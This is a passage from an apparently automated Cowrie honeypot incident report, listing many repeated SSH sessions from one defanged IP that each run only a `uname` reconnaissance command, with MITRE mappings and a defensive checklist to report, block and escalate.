- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc7c5bfb2ea7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:09` | `cowrie.session.connect` |
| `2026-08-24 01:16:09` | `cowrie.client.version` |
| `2026-08-24 01:16:10` | `cowrie.client.kex` |
| `2026-08-24 01:16:10` | `cowrie.login.success` |
| `2026-08-24 01:16:11` | `cowrie.session.params` |
| `2026-08-24 01:16:11` | `cowrie.command.input` |
| `2026-08-24 01:16:11` | `cowrie.log.closed` |
| `2026-08-24 01:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4004b0f885bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:15` | `cowrie.session.connect` |
| `2026-08-24 01:16:15` | `cowrie.client.version` |
| `2026-08-24 01:16:15` | `cowrie.client.kex` |
| `2026-08-24 01:16:16` | `cowrie.login.success` |
| `2026-08-24 01:16:16` | `cowrie.session.params` |
| `2026-08-24 01:16:16` | `cowrie.command.input` |
| `2026-08-24 01:16:16` | `cowrie.log.closed` |
| `2026-08-24 01:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7974b8d31d1a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:20` | `cowrie.session.connect` |
| `2026-08-24 01:16:20` | `cowrie.client.version` |
| `2026-08-24 01:16:20` | `cowrie.client.kex` |
| `2026-08-24 01:16:21` | `cowrie.login.success` |
| `2026-08-24 01:16:22` | `cowrie.session.params` |
| `2026-08-24 01:16:22` | `cowrie.command.input` |
| `2026-08-24 01:16:22` | `cowrie.log.closed` |
| `2026-08-24 01:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806007de55fc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:26` | `cowrie.session.connect` |
| `2026-08-24 01:16:26` | `cowrie.client.version` |
| `2026-08-24 01:16:26` | `cowrie.client.kex` |
| `2026-08-24 01:16:26` | `cowrie.login.success` |
| `2026-08-24 01:16:27` | `cowrie.session.params` |
| `2026-08-24 01:16:27` | `cowrie.command.input` |
| `2026-08-24 01:16:27` | `cowrie.log.closed` |
| `2026-08-24 01:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57c67090a5c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:31` | `cowrie.session.connect` |
| `2026-08-24 01:16:31` | `cowrie.client.version` |
| `2026-08-24 01:16:31` | `cowrie.client.kex` |
| `2026-08-24 01:16:32` | `cowrie.login.success` |
| `2026-08-24 01:16:33` | `cowrie.session.params` |
| `2026-08-24 01:16:33` | `cowrie.command.input` |
| `2026-08-24 01:16:33` | `cowrie.log.closed` |
| `2026-08-24 01:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c7d5d2d7c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:37` | `cowrie.session.connect` |
| `2026-08-24 01:16:37` | `cowrie.client.version` |
| `2026-08-24 01:16:37` | `cowrie.client.kex` |
| `2026-08-24 01:16:37` | `cowrie.login.success` |
| `2026-08-24 01:16:38` | `cowrie.session.params` |
| `2026-08-24 01:16:38` | `cowrie.command.input` |
| `2026-08-24 01:16:38` | `cowrie.log.closed` |
| `2026-08-24 01:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3830abb01bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:42` | `cowrie.session.connect` |
| `2026-08-24 01:16:42` | `cowrie.client.version` |
| `2026-08-24 01:16:42` | `cowrie.client.kex` |
| `2026-08-24 01:16:42` | `cowrie.login.success` |
| `2026-08-24 01:16:43` | `cowrie.session.params` |
| `2026-08-24 01:16:43` | `cowrie.command.input` |
| `2026-08-24 01:16:43` | `cowrie.log.closed` |
| `2026-08-24 01:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5248a18aaf57

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:47` | `cowrie.session.connect` |
| `2026-08-24 01:16:48` | `cowrie.client.version` |
| `2026-08-24 01:16:48` | `cowrie.client.kex` |
| `2026-08-24 01:16:48` | `cowrie.login.success` |
| `2026-08-24 01:16:49` | `cowrie.session.params` |
| `2026-08-24 01:16:49` | `cowrie.command.input` |
| `2026-08-24 01:16:49` | `cowrie.log.closed` |
| `2026-08-24 01:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d30d01925ff0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:53` | `cowrie.session.connect` |
| `2026-08-24 01:16:53` | `cowrie.client.version` |
| `2026-08-24 01:16:53` | `cowrie.client.kex` |
| `2026-08-24 01:16:53` | `cowrie.login.success` |
| `2026-08-24 01:16:54` | `cowrie.session.params` |
| `2026-08-24 01:16:54` | `cowrie.command.input` |
| `2026-08-24 01:16:54` | `cowrie.log.closed` |
| `2026-08-24 01:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab0875e1482

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:58` | `cowrie.session.connect` |
| `2026-08-24 01:16:58` | `cowrie.client.version` |
| `2026-08-24 01:16:58` | `cowrie.client.kex` |
| `2026-08-24 01:16:58` | `cowrie.login.success` |
| `2026-08-24 01:16:59` | `cowrie.session.params` |
| `2026-08-24 01:16:59` | `cowrie.command.input` |
| `2026-08-24 01:16:59` | `cowrie.log.closed` |
| `2026-08-24 01:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e7069a949f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:03` | `cowrie.session.connect` |
| `2026-08-24 01:17:03` | `cowrie.client.version` |
| `2026-08-24 01:17:03` | `cowrie.client.kex` |
| `2026-08-24 01:17:04` | `cowrie.login.success` |
| `2026-08-24 01:17:05` | `cowrie.session.params` |
| `2026-08-24 01:17:05` | `cowrie.command.input` |
| `2026-08-24 01:17:05` | `cowrie.log.closed` |
| `2026-08-24 01:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4752792d3e4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:09` | `cowrie.session.connect` |
| `2026-08-24 01:17:09` | `cowrie.client.version` |
| `2026-08-24 01:17:09` | `cowrie.client.kex` |
| `2026-08-24 01:17:09` | `cowrie.login.success` |
| `2026-08-24 01:17:10` | `cowrie.session.params` |
| `2026-08-24 01:17:10` | `cowrie.command.input` |
| `2026-08-24 01:17:11` | `cowrie.log.closed` |
| `2026-08-24 01:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cabecfa0eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:14` | `cowrie.session.connect` |
| `2026-08-24 01:17:14` | `cowrie.client.version` |
| `2026-08-24 01:17:14` | `cowrie.client.kex` |
| `2026-08-24 01:17:15` | `cowrie.login.success` |
| `2026-08-24 01:17:15` | `cowrie.session.params` |
| `2026-08-24 01:17:15` | `cowrie.command.input` |
| `2026-08-24 01:17:15` | `cowrie.log.closed` |
| `2026-08-24 01:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ac5f323f3e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:19` | `cowrie.session.connect` |
| `2026-08-24 01:17:19` | `cowrie.client.version` |
| `2026-08-24 01:17:19` | `cowrie.client.kex` |
| `2026-08-24 01:17:20` | `cowrie.login.success` |
| `2026-08-24 01:17:21` | `cowrie.session.params` |
| `2026-08-24 01:17:21` | `cowrie.command.input` |
| `2026-08-24 01:17:21` | `cowrie.log.closed` |
| `2026-08-24 01:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc9614b1e6ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:24` | `cowrie.session.connect` |
| `2026-08-24 01:17:24` | `cowrie.client.version` |
| `2026-08-24 01:17:25` | `cowrie.client.kex` |
| `2026-08-24 01:17:25` | `cowrie.login.success` |
| `2026-08-24 01:17:26` | `cowrie.session.params` |
| `2026-08-24 01:17:26` | `cowrie.command.input` |
| `2026-08-24 01:17:26` | `cowrie.log.closed` |
| `2026-08-24 01:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e46d289744

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:30` | `cowrie.session.connect` |
| `2026-08-24 01:17:30` | `cowrie.client.version` |
| `2026-08-24 01:17:30` | `cowrie.client.kex` |
| `2026-08-24 01:17:30` | `cowrie.login.success` |
| `2026-08-24 01:17:31` | `cowrie.session.params` |
| `2026-08-24 01:17:31` | `cowrie.command.input` |
| `2026-08-24 01:17:31` | `cowrie.log.closed` |
| `2026-08-24 01:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f88c36816ced

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:35` | `cowrie.session.connect` |
| `2026-08-24 01:17:35` | `cowrie.client.version` |
| `2026-08-24 01:17:35` | `cowrie.client.kex` |
| `2026-08-24 01:17:36` | `cowrie.login.success` |
| `2026-08-24 01:17:37` | `cowrie.session.params` |
| `2026-08-24 01:17:37` | `cowrie.command.input` |
| `2026-08-24 01:17:37` | `cowrie.log.closed` |
| `2026-08-24 01:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc8cf6ddc57

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:41` | `cowrie.session.connect` |
| `2026-08-24 01:17:41` | `cowrie.client.version` |
| `2026-08-24 01:17:41` | `cowrie.client.kex` |
| `2026-08-24 01:17:41` | `cowrie.login.success` |
| `2026-08-24 01:17:42` | `cowrie.session.params` |
| `2026-08-24 01:17:42` | `cowrie.command.input` |
| `2026-08-24 01:17:42` | `cowrie.log.closed` |
| `2026-08-24 01:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec134519bb2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:46` | `cowrie.session.connect` |
| `2026-08-24 01:17:46` | `cowrie.client.version` |
| `2026-08-24 01:17:46` | `cowrie.client.kex` |
| `2026-08-24 01:17:46` | `cowrie.login.success` |
| `2026-08-24 01:17:47` | `cowrie.session.params` |
| `2026-08-24 01:17:47` | `cowrie.command.input` |
| `2026-08-24 01:17:48` | `cowrie.log.closed` |
| `2026-08-24 01:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc45ef2d12c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:51` | `cowrie.session.connect` |
| `2026-08-24 01:17:51` | `cowrie.client.version` |
| `2026-08-24 01:17:51` | `cowrie.client.kex` |
| `2026-08-24 01:17:52` | `cowrie.login.success` |
| `2026-08-24 01:17:53` | `cowrie.session.params` |
| `2026-08-24 01:17:53` | `cowrie.command.input` |
| `2026-08-24 01:17:53` | `cowrie.log.closed` |
| `2026-08-24 01:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-babdce6caa2e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:17 |
| **Last Seen** | 2026-08-24 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:17:57` | `cowrie.session.connect` |
| `2026-08-24 01:17:57` | `cowrie.client.version` |
| `2026-08-24 01:17:57` | `cowrie.client.kex` |
| `2026-08-24 01:17:57` | `cowrie.login.success` |
| `2026-08-24 01:17:58` | `cowrie.session.params` |
| `2026-08-24 01:17:58` | `cowrie.command.input` |
| `2026-08-24 01:17:58` | `cowrie.log.closed` |
| `2026-08-24 01:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ffb9fd7d742

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:02` | `cowrie.session.connect` |
| `2026-08-24 01:18:02` | `cowrie.client.version` |
| `2026-08-24 01:18:02` | `cowrie.client.kex` |
| `2026-08-24 01:18:02` | `cowrie.login.success` |
| `2026-08-24 01:18:03` | `cowrie.session.params` |
| `2026-08-24 01:18:03` | `cowrie.command.input` |
| `2026-08-24 01:18:03` | `cowrie.log.closed` |
| `2026-08-24 01:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da2dea1a115

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:07` | `cowrie.session.connect` |
| `2026-08-24 01:18:07` | `cowrie.client.version` |
| `2026-08-24 01:18:07` | `cowrie.client.kex` |
| `2026-08-24 01:18:08` | `cowrie.login.success` |
| `2026-08-24 01:18:09` | `cowrie.session.params` |
| `2026-08-24 01:18:09` | `cowrie.command.input` |
| `2026-08-24 01:18:09` | `cowrie.log.closed` |
| `2026-08-24 01:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8fe446722fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:12` | `cowrie.session.connect` |
| `2026-08-24 01:18:13` | `cowrie.client.version` |
| `2026-08-24 01:18:13` | `cowrie.client.kex` |
| `2026-08-24 01:18:13` | `cowrie.login.success` |
| `2026-08-24 01:18:14` | `cowrie.session.params` |
| `2026-08-24 01:18:14` | `cowrie.command.input` |
| `2026-08-24 01:18:14` | `cowrie.log.closed` |
| `2026-08-24 01:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3efe7f5e424e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:18` | `cowrie.session.connect` |
| `2026-08-24 01:18:18` | `cowrie.client.version` |
| `2026-08-24 01:18:18` | `cowrie.client.kex` |
| `2026-08-24 01:18:18` | `cowrie.login.success` |
| `2026-08-24 01:18:19` | `cowrie.session.params` |
| `2026-08-24 01:18:19` | `cowrie.command.input` |
| `2026-08-24 01:18:19` | `cowrie.log.closed` |
| `2026-08-24 01:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f72daff89c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:18 |
| **Last Seen** | 2026-08-24 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:18:23` | `cowrie.session.connect` |
